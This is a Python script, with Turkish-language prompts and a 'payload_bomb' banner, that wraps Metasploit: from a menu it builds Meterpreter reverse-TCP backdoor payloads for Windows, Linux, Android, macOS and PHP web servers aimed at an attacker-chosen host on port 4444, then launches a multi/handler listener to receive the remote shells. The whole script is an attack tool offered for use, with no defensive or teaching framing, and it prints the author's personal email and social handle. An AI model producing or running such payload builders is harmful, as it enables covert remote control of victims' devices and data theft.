import os 
from time import sleep as uyu
if os.name == "posix":    
    os.system("clear")
elif os.name == "nt":
    os.system("cls")
else:
	pass
print("Lütfen program başlayana kadar bekleyiniz.")
uyu(1)
print("coded by root@ebby:~#")
uyu(1)
print("ig : root_ebby / 2003emirkanesme@gmail.com")
os.system("service postgresql start")
uyu(2)
print("""
                 _    ____       _     _           
 _ __ ___   ___ | |_ / __ \  ___| |__ | |__  _   _ 
| '__/ _ \ / _ \| __/ / _` |/ _ \ '_ \| '_ \| | | |
| | | (_) | (_) | || | (_| |  __/ |_) | |_) | |_| |
|_|  \___/ \___/ \__\ \__,_|\___|_.__/|_.__/ \__, |
                     \____/                  |___/       
      """)

uyu(2)
print("""
                   _                 _     _                     _     
 _ __   __ _ _   _| | ___   __ _  __| |   | |__   ___  _ __ ___ | |__  
| '_ \ / _` | | | | |/ _ \ / _` |/ _` |   | '_ \ / _ \| '_ ` _ \| '_ \ 
| |_) | (_| | |_| | | (_) | (_| | (_| |   | |_) | (_) | | | | | | |_) |
| .__/ \__,_|\__, |_|\___/ \__,_|\__,_|___|_.__/ \___/|_| |_| |_|_.__/ 
|_|          |___/                   |_____|            
      """)
uyu(4)
while True:
    try:

        print("""
            *************************
            | coded by root@ebby:~# |
            *************************
            |    Seçenekler         |
            *************************
            |    1. Windows.exe     |
            *************************
            |    2. Linux.py        |
            *************************
            |    3. Android.apk     |
            *************************
            |    4. MacOS.jar       |
            *************************
            |    5. Web.php         |
            *************************
            |    6. "ifconfig"      |
            *************************
            |    7. Contact Me      |
            *************************
            |    99. Exit           |
            *************************   
                """)

        x = int(
            input("==>>>>  ")
            
        )

        if x == 1:
            
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                print("İşletim sisteminiz belirlenemedi , lütfen ip adresinizi manuel olarak bulunuz !.")
            LHOST = input("LHOST : ")
            uyu(2)
            print("Varsayılan LPORT : 4444")
            PATH = input("Nereye kaydedeyim ?(/dizin/) : ")
            print("Değişkenler derleniyor...")
            os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport=4444 -f exe > {}test.exe".format(LHOST,PATH))
            print("""
        Exploit {} dizinine kaydedildi !
                    """.format(PATH))
            uyu(3)
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                pass
            os.system('msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(LHOST)) 




        elif x == 2:
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                print("İşletim sisteminiz belirlenemedi , lütfen ip adresinizi manuel olarak bulunuz !.")
            LHOST = input("LHOST : ")
            uyu(2)
            print("Varsayılan LPORT : 4444")
            PATH = input("Nereye kaydedeyim ?(/dizin/) : ")
            print("Değişkenler derleniyor...")

            os.system('msfvenom -p python/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.py'.format(LHOST,PATH))
            print("""
        Exploit {} dizinine kaydedildi !
                    """.format(PATH))
            uyu(3)
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                pass
            os.system('msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(LHOST))

            


        elif x == 3:
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                print("İşletim sisteminiz belirlenemedi , lütfen ip adresinizi manuel olarak bulunuz !.")
            LHOST = input("LHOST : ")
            uyu(2)
            print("Varsayılan LPORT : 4444")
            PATH = input("Nereye kaydedeyim ?(/dizin/) : ")
            print("Değişkenler derleniyor...")
            os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.apk'.format(LHOST,PATH))
            print("""
        Exploit {} dizinine kaydedildi !
                    """.format(PATH))
            uyu(3)
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                pass
            os.system('msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(LHOST))

        

        elif x == 4:
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                print("İşletim sisteminiz belirlenemedi , lütfen ip adresinizi manuel olarak bulunuz !.")
            LHOST = input("LHOST : ")
            uyu(2)
            print("Varsayılan LPORT : 4444")
            PATH = input("Nereye kaydedeyim ?(/dizin/) : ")
            print("Değişkenler derleniyor...")
            os.system('msfvenom -p java/meterpreter/reverse_tcp lhost={} lport=4444 -f jar > {}test.jar'.format(LHOST,PATH))
            print("""
        Exploit {} dizinine kaydedildi !
                    """.format(PATH))
            uyu(3)
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                pass
            os.system('msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(LHOST))


        elif x == 5:
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                print("İşletim sisteminiz belirlenemedi , lütfen ip adresinizi manuel olarak bulunuz !.")
            LHOST = input("LHOST : ")
            uyu(2)
            print("Varsayılan LPORT : 4444")
            PATH = input("Nereye kaydedeyim ?(/dizin/) : ")
            print("Değişkenler derleniyor...")
            os.system('msfvenom -p php/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.php'.format(LHOST,PATH))
            print("""
        Exploit {} dizinine kaydedildi !
                    """.format(PATH))
            uyu(3)
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                pass
            os.system('msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(LHOST))



        elif x == 6:
            if os.name == "posix":
                
                os.system("clear")
                os.system("ifconfig")
            elif os.name == "nt":
                
                os.system("cls")
                os.system("ipconfig")
            else:
                
                print("İşletim sisteminiz belirlenemedi , lütfen ip adresinizi manuel olarak bulunuz !.")

        elif x == 7:
            if os.name == "posix":
                
                os.system("clear")
            elif os.name == "nt":
                
                os.system("cls")
            else:
                pass
            
            print("coded by root@ebby:~#")
            uyu(2)
            print("ig : root_ebby / 2003emirkanesme@gmail.com")
            uyu(2)
            print("""
                            _    ____       _     _           
            _ __ ___   ___ | |_ / __ \  ___| |__ | |__  _   _ 
            | '__/ _ \ / _ \| __/ / _` |/ _ \ '_ \| '_ \| | | |
            | | | (_) | (_) | || | (_| |  __/ |_) | |_) | |_| |
            |_|  \___/ \___/ \__\ \__,_|\___|_.__/|_.__/ \__, |
                                \____/                  |___/       
                    """)

            ebby = input("Devam etmek için herhangi bir tuşa basınız...")
        
        elif x == 99:
            if os.name == "posix":
                
                os.system("clear")
            elif os.name == "nt":
                
                os.system("cls")
            else:
                pass
            
            print("coded by root@ebby:~#")
            uyu(2)
            print("ig : root_ebby / 2003emirkanesme@gmail.com")
            uyu(2)
            print("""
                             _    ____       _     _           
             _ __ ___   ___ | |_ / __ \  ___| |__ | |__  _   _ 
            | '__/ _ \ / _ \| __/ / _` |/ _ \ '_ \| '_ \| | | |
            | | | (_) | (_) | || | (_| |  __/ |_) | |_) | |_| |
            |_|  \___/ \___/ \__\ \__,_|\___|_.__/|_.__/ \__, |
                                \____/                  |___/       
            """)

            uyu(3)
            exit()


        
        
        else:
            print("Lütfen belirli opsiyonlardan birini seçiniz !!!!")
    except Exception as hata:
        print("Hata : {}".format(hata))













